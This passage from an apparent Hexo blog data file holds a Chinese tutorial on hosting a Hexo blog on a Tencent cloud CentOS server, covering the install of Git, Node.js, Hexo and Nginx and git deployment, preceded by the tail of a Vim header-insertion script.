</span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+6, &quot;</span><span class=\"meta-string\">&quot;) </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">    else </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call setline(1, &quot;</span><span class=\"comment\">/******************************&quot;) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;), &quot;    &gt; File Name: &quot;.expand(&quot;%&quot;)) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;)+1, &quot;    &gt; Author:Li Ziqiang&quot;) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;)+2, &quot;    &gt; Mail: 2296557984@qq.com &quot;) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;)+3, &quot;    &gt; Created Time: &quot;.strftime(&quot;%c&quot;)) </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"meta\">        call append(line(&quot;.&quot;)+4, &quot; *****************************/</span><span class=\"meta-string\">&quot;) </span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">        call append(line(&quot;</span>.<span class=\"meta-string\">&quot;)+5, &quot;</span><span class=\"meta-string\">&quot;)</span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">    endif</span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\"></span></span></span><br><span class=\"line\"><span class=\"meta-string\"><span class=\"meta\">    &quot;</span>新建文件后，自动定位到文件末尾</span></span><br><span class=\"line\">    autocmd BufNewFile * normal G</span><br><span class=\"line\">endfunc </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>"},{"title":"hexo＋腾讯云主机搭建博客","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_6.jpg","top":false,"_content":"\n\n## hexo＋腾讯云主机搭建博客\n\n- [参考链接1](https://zhuanlan.zhihu.com/p/120322118)\n- [参考链接2](https://www.jianshu.com/p/31eb5c754c01)\n- [参考链接3](https://zhuanlan.zhihu.com/p/60578464)\n\n+ 说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）\n\n<!--more-->\n\n### 一．Git安装\n\n- 我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧\n- 先检查是否有git\n\n```\ngit --version\n```\n\n- 没有则安装，旧的卸载重装\n\n```\n＃卸载旧的git\nyum remove git\n# 安装依赖库\nyum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel\n# 将git下载安装到/usr/local/src目录\ncd /usr/local/src\nwget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz\ntar -zvxf git-2.26.0.tar.gz\n# 进入目录\ncd git-2.26.0\n# 编译执行\nmake prefix=/usr/local/git all\n# 安装 git 到 /usr/local/git 目录下\nmake prefix=/usr/local/git install\n\n```\n\n### 二、配置Git环境变量\n\n- 打开环境变量配置文件进行配置\n\n```\nvim /etc/profile\n\n#添加以下内容\nPATH=$PATH:/usr/local/git/bin   # git 的目录\nexport PATH\n\n# 使配置的环境变量生效\nsource /etc/profile\n```\n\n- 验证git安装成功\n\n```\ngit --version\n```\n\n### 三、云主机与GitHub交换SSH密匙\n\n- Git初始化\n\n```\n# 设置github昵称\ngit config --global user.name 'mxrmiss'\n# 设置github邮箱\ngit config --global user.email 'heroli520@outlook.com'\n```\n\n- git status 无法显示中文\n\n```\ngit config --global core.quotepath false\n```\n\n- 创建ssh密匙\n\n```\nssh-keygen -t rsa -C \"GitHub 邮箱\"\n```\n\n- 输出 id_rsa.pub 内容并复制到GitHub中的setting页面上\n\n```\ncat id_rsa.pub\n```\n\n[![syONLT.jpg](https://s3.ax1x.com/2021/01/18/syONLT.jpg)](https://imgchr.com/i/syONLT)\n\n- ssh -T [git@github.com](mailto:git@github.com) 输入此命令，显示successful表示成功\n\n### 四、node.js安装\n\n1. node.js下载\n\n```\ncd /opt\nwget https://npm.taobao.org/mirrors/node/latest-v15.x/node-v15.0.1-linux-x64.tar.xz  # 下载二进制安装包\n```\n\n2. node.js部署\n\n```\ncd /opt\ntar xf node-v10.16.0-linux-x64.tar.xz \nln -s node-v10.16.0-linux-x64 nodejs\nnodejs -> node-v10.16.0-linux-x64\n```\n\n3. 版本信息\n\n```\ncd /opt/nodejs/bin\n./node -v\n会看到 v10.16.0\n```\n\n4. 创建软连接\n\n```\nln -s /opt/nodejs/bin/node /usr/local/bin/node\nln -s /opt/nodejs/bin/npm  /usr/local/bin/npm\n\n# 验证\nnode -v\n```\n\n### 五、hexo 部署\n\n1. 安装hexo\n\n```\nnpm install hexo-cli -g \n```\n\n2. 采用软连接的方式将hexo添加入全局变量\n\n```\nln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo\n```\n\n3. 将自己GitHub中存储的hexo博客ssh下载到主机中\n\n### 六、使用Nginx部署Hexo站点\n\n1. Nginx安装\n\n```\nyum install -y nginx\n```\n\n2. 配置Nginx\n\n```\nnginx -t\n```\n\n3. 使用vim打开nginx.conf文件\n\n- 注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载\n\n```\nvim /etc/nginx/nginx.conf\n```\n\n[![s6S4k8.png](https://s3.ax1x.com/2021/01/18/s6S4k8.png)](https://imgchr.com/i/s6S4k8)\n\n4. 启动Nginx\n\n```\nsystemctl start nginx.service\n```\n\n5. 重启Nginx\n\n```\nsystemctl restart nginx.service\n```\n\n### 七、配置本地hexo\n\n- 博客根目录_config下增加\n\n```\ndeploy:\n    type: git  (必须是git)\n    repo: root@***(服务器外网ip):#仓库地址\n    branch: master   \n```\n\n- 进入自己的hexo博客目录\n- hexo clean\n- hexo g\n- hexo d\n- 搜索自己的域名便可访问\n","source":"_posts/hexo+腾讯云主机搭建博客.md","raw":"---\ntitle: hexo＋腾讯云主机搭建博客\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_6.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: blog\ntags: [hexo, blog]   # 可以是数组\ntop: false\n---\n\n\n## hexo＋腾讯云主机搭建博客\n\n- [参考链接1](https://zhuanlan.zhihu.com/p/120322118)\n- [参考链接2](https://www.jianshu.com/p/31eb5c754c01)\n- [参考链接3](https://zhuanlan.zhihu.com/p/60578464)\n\n+ 说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）\n\n<!--more-->\n\n### 一．Git安装\n\n- 我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧\n- 先检查是否有git\n\n```\ngit --version\n```\n\n- 没有则安装，旧的卸载重装\n\n```\n＃卸载旧的git\nyum remove git\n# 安装依赖库\nyum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel\n# 将git下载安装到/usr/local/src目录\ncd /usr/local/src\nwget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz\ntar -zvxf git-2.26.0.tar.gz\n# 进入目录\ncd git-2.26.0\n# 编译执行\nmake prefix=/usr/local/git all\n# 安装 git 到 /usr/local/git 目录下\nmake prefix=/usr/local/git install\n\n```\n\n### 二、配置Git环境变量\n\n- 打开环境变量配置文件进行配置\n\n```\nvim /etc/profile\n\n#添加以下内容\nPATH=$PATH:/usr/local/git/bin   # git 的目录\nexport PATH\n\n# 使配置的环境变量生效\nsource /etc/profile\n```\n\n- 验证git安装成功\n\n```\ngit --version\n```\n\n### 三、云主机与GitHub交换SSH密匙\n\n- Git初始化\n\n```\n# 设置github昵称\ngit config --global user.name 'mxrmiss'\n# 设置github邮箱\ngit config --global user.email 'heroli520@outlook.com'\n```\n\n- git status 无法显示中文\n\n```\ngit config --global core.quotepath false\n```\n\n- 创建ssh密匙\n\n```\nssh-keygen -t rsa -C \"GitHub 邮箱\"\n```\n\n- 输出 id_rsa.pub 内容并复制到GitHub中的setting页面上\n\n```\ncat id_rsa.pub\n```\n\n[![syONLT.jpg](https://s3.ax1x.com/2021/01/18/syONLT.jpg)](https://imgchr.com/i/syONLT)\n\n- ssh -T [git@github.com](mailto:git@github.com) 输入此命令，显示successful表示成功\n\n### 四、node.js安装\n\n1. node.js下载\n\n```\ncd /opt\nwget https://npm.taobao.org/mirrors/node/latest-v15.x/node-v15.0.1-linux-x64.tar.xz  # 下载二进制安装包\n```\n\n2. node.js部署\n\n```\ncd /opt\ntar xf node-v10.16.0-linux-x64.tar.xz \nln -s node-v10.16.0-linux-x64 nodejs\nnodejs -> node-v10.16.0-linux-x64\n```\n\n3. 版本信息\n\n```\ncd /opt/nodejs/bin\n./node -v\n会看到 v10.16.0\n```\n\n4. 创建软连接\n\n```\nln -s /opt/nodejs/bin/node /usr/local/bin/node\nln -s /opt/nodejs/bin/npm  /usr/local/bin/npm\n\n# 验证\nnode -v\n```\n\n### 五、hexo 部署\n\n1. 安装hexo\n\n```\nnpm install hexo-cli -g \n```\n\n2. 采用软连接的方式将hexo添加入全局变量\n\n```\nln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo\n```\n\n3. 将自己GitHub中存储的hexo博客ssh下载到主机中\n\n### 六、使用Nginx部署Hexo站点\n\n1. Nginx安装\n\n```\nyum install -y nginx\n```\n\n2. 配置Nginx\n\n```\nnginx -t\n```\n\n3. 使用vim打开nginx.conf文件\n\n- 注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载\n\n```\nvim /etc/nginx/nginx.conf\n```\n\n[![s6S4k8.png](https://s3.ax1x.com/2021/01/18/s6S4k8.png)](https://imgchr.com/i/s6S4k8)\n\n4. 启动Nginx\n\n```\nsystemctl start nginx.service\n```\n\n5. 重启Nginx\n\n```\nsystemctl restart nginx.service\n```\n\n### 七、配置本地hexo\n\n- 博客根目录_config下增加\n\n```\ndeploy:\n    type: git  (必须是git)\n    repo: root@***(服务器外网ip):#仓库地址\n    branch: master   \n```\n\n- 进入自己的hexo博客目录\n- hexo clean\n- hexo g\n- hexo d\n- 搜索自己的域名便可访问\n","slug":"hexo+腾讯云主机搭建博客","published":1,"updated":"2021-06-20T02:52:37.411Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzaxl00097vvta3w5ahix","content":"<h2 id=\"hexo＋腾讯云主机搭建博客\"><a href=\"#hexo＋腾讯云主机搭建博客\" class=\"headerlink\" title=\"hexo＋腾讯云主机搭建博客\"></a>hexo＋腾讯云主机搭建博客</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/120322118\">参考链接1</a></li>\n<li><a href=\"https://www.jianshu.com/p/31eb5c754c01\">参考链接2</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/60578464\">参考链接3</a></li>\n</ul>\n<ul>\n<li>说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）</li>\n</ul>\n<span id=\"more\"></span>\n\n<h3 id=\"一．Git安装\"><a href=\"#一．Git安装\" class=\"headerlink\" title=\"一．Git安装\"></a>一．Git安装</h3><ul>\n<li>我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧</li>\n<li>先检查是否有git</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git --version</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>没有则安装，旧的卸载重装</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">＃卸载旧的git</span><br><span class=\"line\">yum remove git</span><br><span class=\"line\"># 安装依赖库</span><br><span class=\"line\">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel</span><br><span class=\"line\"># 将git下载安装到/usr/local/src目录</span><br><span class=\"line\">cd /usr/local/src</span><br><span class=\"line\">wget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz</span><br><span class=\"line\">tar -zvxf git-2.26.0.tar.gz</span><br><span class=\"line\"># 进入目录</span><br><span class=\"line\">cd git-2.26.0</span><br><span class=\"line\"># 编译执行</span><br><span class=\"line\">make prefix=/usr/local/git all</span><br><span class=\"line\"># 安装 git 到 /usr/local/git 目录下</span><br><span class=\"line\">make prefix=/usr/local/git install</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"二、配置Git环境变量\"><a href=\"#二、配置Git环境变量\" class=\"headerlink\" title=\"二、配置Git环境变量\"></a>二、配置Git环境变量</h3><ul>\n<li>打开环境变量配置文件进行配置</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/profile</span><br><span class=\"line\"></span><br><span class=\"line\">#添加以下内容</span><br><span class=\"line\">PATH=$PATH:/usr/local/git/bin   # git 的目录</span><br><span class=\"line\">export PATH</span><br><span class=\"line\"></span><br><span class=\"line\"># 使配置的环境变量生效</span><br><span class=\"line\">source /etc/profile</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>验证git安装成功</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git --version</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"三、云主机与GitHub交换SSH密匙\"><a href=\"#三、云主机与GitHub交换SSH密匙\" class=\"headerlink\" title=\"三、云主机与GitHub交换SSH密匙\"></a>三、云主机与GitHub交换SSH密匙</h3><ul>\n<li>Git初始化</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 设置github昵称</span><br><span class=\"line\">git config --global user.name &#x27;mxrmiss&#x27;</span><br><span class=\"line\"># 设置github邮箱</span><br><span class=\"line\">git config --global user.email &#x27;heroli520@outlook.com&#x27;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>git status 无法显示中文</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global core.quotepath false</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>创建ssh密匙</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C &quot;GitHub 邮箱&quot;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>输出 id_rsa.pub 内容并复制到GitHub中的setting页面上</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat id_rsa.pub</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://imgchr.com/i/syONLT\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s3.ax1x.com/2021/01/18/syONLT.jpg\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"syONLT.jpg\"></a></p>\n<ul>\n<li>ssh -T <a href=\"mailto:git@github.com\">git@github.com</a> 输入此命令，显示successful表示成功</li>\n</ul>\n<h3 id=\"四、node-js安装\"><a href=\"#四、node-js安装\" class=\"headerlink\" title=\"四、node.js安装\"></a>四、node.js安装</h3><ol>\n<li>node.js下载</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /opt</span><br><span class=\"line\">wget https://npm.taobao.org/mirrors/node/latest-v15.x/node-v15.0.1-linux-x64.tar.xz  # 下载二进制安装包</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>node.js部署</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /opt</span><br><span class=\"line\">tar xf node-v10.16.0-linux-x64.tar.xz </span><br><span class=\"line\">ln -s node-v10.16.0-linux-x64 nodejs</span><br><span class=\"line\">nodejs -&gt; node-v10.16.0-linux-x64</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>版本信息</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /opt/nodejs/bin</span><br><span class=\"line\">./node -v</span><br><span class=\"line\">会看到 v10.16.0</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>创建软连接</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s /opt/nodejs/bin/node /usr/local/bin/node</span><br><span class=\"line\">ln -s /opt/nodejs/bin/npm  /usr/local/bin/npm</span><br><span class=\"line\"></span><br><span class=\"line\"># 验证</span><br><span class=\"line\">node -v</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"五、hexo-部署\"><a href=\"#五、hexo-部署\" class=\"headerlink\" title=\"五、hexo 部署\"></a>五、hexo 部署</h3><ol>\n<li>安装hexo</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-cli -g </span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>采用软连接的方式将hexo添加入全局变量</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>将自己GitHub中存储的hexo博客ssh下载到主机中</li>\n</ol>\n<h3 id=\"六、使用Nginx部署Hexo站点\"><a href=\"#六、使用Nginx部署Hexo站点\" class=\"headerlink\" title=\"六、使用Nginx部署Hexo站点\"></a>六、使用Nginx部署Hexo站点</h3><ol>\n<li>Nginx安装</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y nginx</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>配置Nginx</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -t</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>使用vim打开nginx.conf文件</li>\n</ol>\n<ul>\n<li>注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://imgchr.com/i/s6S4k8\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s3.ax1x.com/2021/01/18/s6S4k8.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"s6S4k8.png\"></a></p>\n<ol start=\"4\">\n<li>启动Nginx</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start nginx.service</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>重启Nginx</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart nginx.service</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"七、配置本地hexo\"><a href=\"#七、配置本地hexo\" class=\"headerlink\" title=\"七、配置本地hexo\"></a>七、配置本地hexo</h3><ul>\n<li>博客根目录_config下增加</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">    type: git  (必须是git)</span><br><span class=\"line\">    repo: root@***(服务器外网ip):#仓库地址</span><br><span class=\"line\">    branch: master   </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>进入自己的hexo博客目录</li>\n<li>hexo clean</li>\n<li>hexo g</li>\n<li>hexo d</li>\n<li>搜索自己的域名便可访问</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"hexo＋腾讯云主机搭建博客\"><a href=\"#hexo＋腾讯云主机搭建博客\" class=\"headerlink\" title=\"hexo＋腾讯云主机搭建博客\"></a>hexo＋腾讯云主机搭建博客</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/120322118\">参考链接1</a></li>\n<li><a href=\"https://www.jianshu.com/p/31eb5c754c01\">参考链接2</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/60578464\">参考链接3</a></li>\n</ul>\n<ul>\n<li>说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）</li>\n</ul>","more":"<h3 id=\"一．Git安装\"><a href=\"#一．Git安装\" class=\"headerlink\" title=\"一．Git安装\"></a>一．Git安装</h3><ul>\n<li>我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧</li>\n<li>先检查是否有git</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git --version</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>没有则安装，旧的卸载重装</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">＃卸载旧的git</span><br><span class=\"line\">yum remove git</span><br><span class=\"line\"># 安装依赖库</span><br><span class=\"line\">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel</span><br><span class=\"line\"># 将git下载安装到/usr/local/src目录</span><br><span class=\"line\">cd /usr/local/src</span><br><span class=\"line\">wget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz</span><br><span class=\"line\">tar -zvxf git-2.26.0.tar.gz</span><br><span class=\"line\"># 进入目录</span><br><span class=\"line\">cd git-2.26.0</span><br><span class=\"line\"># 编译执行</span><br><span class=\"line\">make prefix=/usr/local/git all</span><br><span class=\"line\"># 安装 git 到 /usr/local/git 目录下</span><br><span class=\"line\">make prefix=/usr/local/git install</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"二、配置Git环境变量\"><a href=\"#二、配置Git环境变量\" class=\"headerlink\" title=\"二、配置Git环境变量\"></a>二、配置Git环境变量</h3><ul>\n<li>打开环境变量配置文件进行配置</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/profile</span><br><span class=\"line\"></span><br><span class=\"line\">#添加以下内容</span><br><span class=\"line\">PATH=$PATH:/usr/local/git/bin   # git 的目录</span><br><span class=\"line\">export PATH</span><br><span class=\"line\"></span><br><span class=\"line\"># 使配置的环境变量生效</span><br><span class=\"line\">source /etc/profile</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>验证git安装成功</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git --version</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"三、云主机与GitHub交换SSH密匙\"><a href=\"#三、云主机与GitHub交换SSH密匙\" class=\"headerlink\" title=\"三、云主机与GitHub交换SSH密匙\"></a>三、云主机与GitHub交换SSH密匙</h3><ul>\n<li>Git初始化</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 设置github昵称</span><br><span class=\"line\">git config --global user.name &#x27;mxrmiss&#x27;</span><br><span class=\"line\"># 设置github邮箱</span><br><span class=\"line\">git config --global user.email &#x27;heroli520@outlook.com&#x27;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>git status 无法显示中文</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global core.quotepath false</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>创建ssh密匙</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C &quot;GitHub 邮箱&quot;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>输出 id_rsa.pub 内容并复制到GitHub中的setting页面上</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat id_rsa.pub</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://imgchr.com/i/syONLT\"><img src=\"https://s3.ax1x.com/2021/01/18/syONLT.jpg\" alt=\"syONLT.jpg\"></a></p>\n<ul>\n<li>ssh -T <a href=\"mailto:git@github.com\">git@github.com</a> 输入此命令，显示successful表示成功</li>\n</ul>\n<h3 id=\"四、node-js安装\"><a href=\"#四、node-js安装\" class=\"headerlink\" title=\"四、node.js安装\"></a>四、node.js安装</h3><ol>\n<li>node.js下载</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /opt</span><br><span class=\"line\">wget https://npm.taobao.org/mirrors/node/latest-v15.x/node-v15.0.1-linux-x64.tar.xz  # 下载二进制安装包</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>node.js部署</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /opt</span><br><span class=\"line\">tar xf node-v10.16.0-linux-x64.tar.xz </span><br><span class=\"line\">ln -s node-v10.16.0-linux-x64 nodejs</span><br><span class=\"line\">nodejs -&gt; node-v10.16.0-linux-x64</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>版本信息</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /opt/nodejs/bin</span><br><span class=\"line\">./node -v</span><br><span class=\"line\">会看到 v10.16.0</span><br></pre></td></tr></table></figure>\n\n<ol 